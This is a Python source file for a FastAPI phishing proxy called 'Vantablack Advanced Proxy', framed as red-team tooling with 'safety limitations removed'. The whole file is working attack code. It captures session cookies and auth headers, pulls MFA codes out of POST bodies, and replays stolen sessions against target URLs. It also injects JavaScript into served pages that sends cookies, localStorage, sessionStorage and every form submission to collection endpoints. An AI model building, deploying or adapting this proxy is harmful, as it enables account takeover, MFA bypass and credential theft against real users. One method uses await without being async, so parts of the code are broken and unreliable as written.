"""
Advanced Proxy Module for Real Red Team Operations
Removes safety limitations and adds professional attack capabilities
"""

import yaml
import re
import json
import base64
import random
from datetime import datetime
import httpx
import uvicorn
import logging
import os
from typing import Dict, Any, Optional, List, Set
from fastapi import FastAPI, Request, Response, Header, Cookie
from fastapi.responses import JSONResponse

logging.basicConfig(level=logging.INFO, 
                   format="%(asctime)s [%(levelname)s] ADV_PROXY: %(message)s")
logger = logging.getLogger("AdvancedProxy")

app = FastAPI(title="Vantablack Advanced Proxy")

class MFABypassEngine:
    """Advanced MFA interception and bypass capabilities"""
    
    def __init__(self):
        self.sms_patterns = [
            r'\b\d{6}\b',  # 6-digit codes
            r'\b\d{4,8}\b',  # 4-8 digit codes
            r'(?i)(?:code|verification|token)[:\s]*[=]?\s*(\d{4,8})',
            r'(?i)(?:mfa|2fa|totp)[:\s]*[=]?\s*(\d{4,8})',
            r'"code"\s*:\s*"(\d+)"',  # JSON patterns
            r'"token"\s*:\s*"(\d+)"'
        ]
        
        self.email_patterns = [
            r'(?i)(?:security|login|verification)\s+code\s+is\s+(\d{6})',
            r'(?i)use\s+the\s+following\s+code\s*[:]?\s*(\d{6})',
            r'(?i)your\s+verification\s+code\s+is\s+(\d{6})'
        ]
    
    def intercept_mfa_codes(self, content: str, content_type: str = "") -> List[str]:
        """Intercept MFA codes from various content types"""
        intercepted = []
        
        # Check SMS patterns
        for pattern in self.sms_patterns:
            matches = re.findall(pattern, content)
            intercepted.extend(matches)
        
        # Check email patterns if content suggests email
        if any(keyword in content_type.lower() for keyword in ['html', 'text']) \
           or any(keyword in content.lower() for keyword in ['email', 'mail']):
            for pattern in self.email_patterns:
                matches = re.findall(pattern, content)
                intercepted.extend(matches)
        
        return list(set(intercepted))  # Deduplicate

class SessionHijacker:
    """Advanced session capture and manipulation"""
    
    def __init__(self):
        self.active_sessions: Dict[str, Dict] = {}
        self.session_keys = {'session', 'auth', 'token', 'jwt', 'oauth', 'bearer', 'access', 'refresh'}
    
    def capture_full_session(self, request: Request) -> Dict:
        """Capture complete session data from request"""
        session_data = {
            'cookies': {},
            'headers': {},
            'ip_address': request.client.host,
            'user_agent': request.headers.get('user-agent', ''),
            'timestamp': datetime.now().isoformat(),
            'method': request.method,
            'url': str(request.url),
            'path': request.url.path
        }
        
        # Capture all relevant cookies
        for name, value in request.cookies.items():
            if any(keyword in name.lower() for keyword in self.session_keys):
                session_data['cookies'][name] = value
        
        # Capture authentication headers
        for name, value in request.headers.items():
            if any(keyword in name.lower() for keyword in self.session_keys):
                session_data['headers'][name] = value
        
        # Store session with unique ID
        session_id = base64.b64encode(f"{session_data['ip_address']}_{datetime.now().timestamp()}".encode()).decode()
        self.active_sessions[session_id] = session_data
        
        logger.info(f"🚀 Session captured: {session_id} - {session_data['ip_address']}")
        return session_data
    
    def replay_session(self, session_id: str, target_url: str) -> httpx.Response:
        """Replay captured session to target URL"""
        if session_id not in self.active_sessions:
            raise ValueError("Session not found")
        
        session = self.active_sessions[session_id]
        
        # Prepare headers with captured auth data
        headers = {
            'User-Agent': session['user_agent'],
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        }
        
        # Add captured headers
        headers.update(session['headers'])
        
        # Make request with captured session
        with httpx.Client() as client:
            # Set cookies
            cookies = session['cookies']
            
            response = client.get(
                target_url,
                headers=headers,
                cookies=cookies,
                follow_redirects=True
            )
        
        logger.info(f"🔁 Session replayed to {target_url} - Status: {response.status_code}")
        return response

class AdvancedPhishletEngine:
    """Enhanced phishlet engine with offensive capabilities"""
    
    def __init__(self, phishlet_path: str):
        self.phishlet_path = phishlet_path
        self.config = self._load_config()
        self.mfa_bypass = MFABypassEngine()
        self.session_hijacker = SessionHijacker()
        self.whitelist_domains = self._load_domains()
    
    def _load_config(self) -> Dict[str, Any]:
        if not os.path.exists(self.phishlet_path):
            logger.error(f"Phishlet file not found: {self.phishlet_path}")
            return {}
        with open(self.phishlet_path, 'r') as f:
            return yaml.safe_load(f)
    
    def _load_domains(self) -> Set[str]:
        """Load whitelisted domains from config and env"""
        domains = set()
        
        # From environment
        env_domains = os.getenv("REDTEAM_DOMAINS", "")
        if env_domains:
            domains.update(d.strip().lower() for d in env_domains.split(","))
        
        # From phishlet config
        config_domains = self.config.get("target_domains", [])
        domains.update(d.strip().lower() for d in config_domains if isinstance(d, str))
        
        return domains
    
    def process_request(self, request: Request) -> Optional[Dict]:
        """Process incoming request for session capture"""
        target_domain = request.url.hostname
        
        # Check if domain is whitelisted for attack
        if target_domain and target_domain.lower() not in self.whitelist_domains:
            logger.warning(f"Domain not in whitelist: {target_domain}")
            return None
        
        # Capture session for all requests to target domains
        session_data = self.session_hijacker.capture_full_session(request)
        
        # Check for MFA codes in POST data
        if request.method == "POST":
            try:
                body = await request.body()
                body_str = body.decode('utf-8', errors='ignore')
                
                mfa_codes = self.mfa_bypass.intercept_mfa_codes(body_str)
                if mfa_codes:
                    session_data['mfa_codes'] = mfa_codes
                    logger.info(f"🎯 MFA Codes intercepted: {mfa_codes}")
                    
            except Exception as e:
                logger.error(f"Error processing POST body: {e}")
        
        return session_data
    
    def inject_session_stealer(self, content: bytes, content_type: str) -> bytes:
        """Inject session stealing JavaScript into responses"""
        if not content_type or 'html' not in content_type.lower():
            return content
        
        try:
            content_str = content.decode('utf-8', errors='ignore')
            
            # Inject session stealer script before </body>
            stealer_js = """
            <script>
            // Advanced session persistence stealer
            setInterval(function() {
                fetch('/_/session/persist', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        cookies: document.cookie,
                        localStorage: JSON.stringify(localStorage),
                        sessionStorage: JSON.stringify(sessionStorage),
                        userAgent: navigator.userAgent,
                        timestamp: new Date().toISOString()
                    })
                }).catch(() => {});
            }, 10000);
            
            // Capture form submissions
            document.addEventListener('submit', function(e) {
                const form = e.target;
                const data = new FormData(form);
                const formData = Object.fromEntries(data.entries());
                
                fetch('/_/form/capture', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(formData)
                }).catch(() => {});
            });
            </script>
            """
            
            if '</body>' in content_str:
                content_str = content_str.replace('</body>', f'{stealer_js}</body>')
                return content_str.encode('utf-8')
            
        except Exception as e:
            logger.error(f"Error injecting session stealer: {e}")
        
        return content

# Global instances
mfa_engine = MFABypassEngine()
session_hijacker = SessionHijacker()

@app.middleware("http")
async def advanced_proxy_middleware(request: Request, call_next):
    """Main middleware for advanced attack capabilities"""
    
    # Get phishlet from environment
    phishlet_path = os.getenv("PHISHLET_PATH")
    if not phishlet_path or not os.path.exists(phishlet_path):
        return await call_next(request)
    
    # Initialize engine
    engine = AdvancedPhishletEngine(phishlet_path)
    
    # Process request for session capture
    session_data = engine.process_request(request)
    if session_data:
        logger.info(f"📡 Session data captured: {len(session_data.get('cookies', {}))} cookies")
    
    # Get original response
    response = await call_next(request)
    
    # Inject session stealer into HTML responses
    content_type = response.headers.get('content-type', '')
    if hasattr(response, 'body'):
        body = b""
        async for chunk in response.body_iterator:
            body += chunk
        
        # Process response body
        processed_body = engine.inject_session_stealer(body, content_type)
        
        return Response(
            content=processed_body,
            status_code=response.status_code,
            headers=dict(response.headers),
            media_type=response.media_type
        )
    
    return response

@app.get("/_/sessions")
async def list_sessions():
    """List all captured sessions"""
    return JSONResponse({
        'count': len(session_hijacker.active_sessions),
        'sessions': list(session_hijacker.active_sessions.keys())
    })

@app.get("/_/session/{session_id}")
async def get_session(session_id: str):
    """Get specific session details"""
    if session_id not in session_hijacker.active_sessions:
        return JSONResponse({"error": "Session not found"}, status_code=404)
    
    return JSONResponse(session_hijacker.active_sessions[session_id])

@app.post("/_/session/replay/{session_id}")
async def replay_session(session_id: str, target_url: str):
    """Replay captured session to target URL"""
    try:
        response = session_hijacker.replay_session(session_id, target_url)
        return JSONResponse({
            'status_code': response.status_code,
            'headers': dict(response.headers),
            'text': response.text
        })
    except Exception as e:
        return JSONResponse({"error": str(e)}, status_code=400)

@app.post("/_/mfa/intercept")
async def intercept_mfa(content: str, content_type: str = ""):
    """Intercept MFA codes from content"""
    codes = mfa_engine.intercept_mfa_codes(content, content_type)
    return JSONResponse({"intercepted_codes": codes})

if __name__ == "__main__":
    print("🚀 Starting Vantablack Advanced Proxy - Red Team Mode Activated")
    print("🔓 Safety limitations removed - Professional attack capabilities enabled")
    print("🎯 Features: Session Hijacking, MFA Bypass, Real-time Capture")
    
    uvicorn.run(app, host="0.0.0.0", port=8080, log_level="info")